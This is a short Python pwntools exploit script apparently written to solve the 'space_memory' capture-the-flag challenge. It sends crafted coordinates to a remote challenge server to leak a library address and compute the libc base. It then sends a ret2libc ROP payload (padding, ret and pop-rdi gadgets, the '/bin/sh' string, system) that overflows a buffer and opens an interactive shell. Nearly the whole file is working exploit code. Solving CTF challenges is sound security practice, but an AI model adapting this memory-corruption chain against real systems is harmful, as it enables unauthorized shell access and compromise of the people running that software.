from pwn import * 
#io = process("./space_memory")
io = remote("spaceheroes-space-memory.chals.io", 443, ssl=True, sni="spaceheroes-space-memory.chals.io")
libc = ELF("./libc.so.6")
libcs50 = ELF("./libcs50.so.11")

io.sendlineafter("Choice:","F")
io.sendlineafter("Pick first card (row, column):","1337,31337")
io.sendlineafter("Pick second card (row, column):","31337,1337")

io.recvuntil("It seems like your a hacker! Enjoy this nice treat: ")
libcs50.address = int(io.recvline()[:-1],16) - libcs50.symbols["get_long_long"]
libc.address = libcs50.address - 2883584

# popRdi gadget in libc
popRdi = libc.address + 0x27725
retGadget = libc.address + 0x270c2

ret2libc = b"A" * 56 + p64(retGadget) + p64(popRdi) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])
io.sendlineafter(">>>",ret2libc)
io.interactive()
